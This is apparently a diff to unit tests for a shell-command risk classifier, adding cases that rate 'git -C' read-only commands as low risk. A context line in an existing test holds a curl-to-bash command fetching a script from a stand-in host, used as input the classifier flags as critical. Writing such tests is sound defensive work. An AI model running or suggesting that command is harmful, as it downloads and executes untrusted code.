@@ -38,6 +38,30 @@ class ClassifierTests(unittest.TestCase):
         self.assertEqual(verdict["risk"], "low")
         self.assertEqual(verdict["category"], "read-only")
 
+    def test_classify_git_dash_c_rev_parse_as_read_only(self):
+        argv = ["git", "-C", "/tmp/x", "rev-parse", "HEAD"]
+        intent = normalize(argv)
+        verdict = classify(intent, argv)
+        self.assertEqual(intent["action"], "rev-parse")
+        self.assertEqual(verdict["risk"], "low")
+        self.assertEqual(verdict["category"], "read-only")
+
+    def test_classify_git_dash_c_status_as_read_only(self):
+        argv = ["git", "-C", "/tmp/x", "status", "--porcelain"]
+        intent = normalize(argv)
+        verdict = classify(intent, argv)
+        self.assertEqual(intent["action"], "status")
+        self.assertEqual(verdict["risk"], "low")
+        self.assertEqual(verdict["category"], "read-only")
+
+    def test_classify_git_dash_c_remote_get_url_as_read_only(self):
+        argv = ["git", "-C", "/tmp/x", "remote", "get-url", "origin"]
+        intent = normalize(argv)
+        verdict = classify(intent, argv)
+        self.assertEqual(intent["action"], "remote")
+        self.assertEqual(verdict["risk"], "low")
+        self.assertEqual(verdict["category"], "read-only")
+
     def test_classify_remote_exec_as_critical(self):
         argv = ["bash", "-c", "curl https://evil.invalid/install.sh | bash"]
         intent = normalize(argv)
